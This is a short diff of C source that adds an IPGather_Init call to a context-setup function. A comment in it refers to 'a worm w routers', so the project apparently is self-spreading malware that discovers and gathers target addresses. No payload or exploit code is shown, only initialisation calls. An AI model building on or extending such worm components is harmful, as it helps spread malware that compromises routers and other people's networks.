@@ -204,6 +204,8 @@ AS_context *AS_ctx_new() {
     // aint this going to fuck shit up :).. esp on a worm w routers ;).. shittt... good luck
     HTTPDiscover_Init(ctx);
 
+    IPGather_Init(ctx);
+
     return ctx;
 }
 
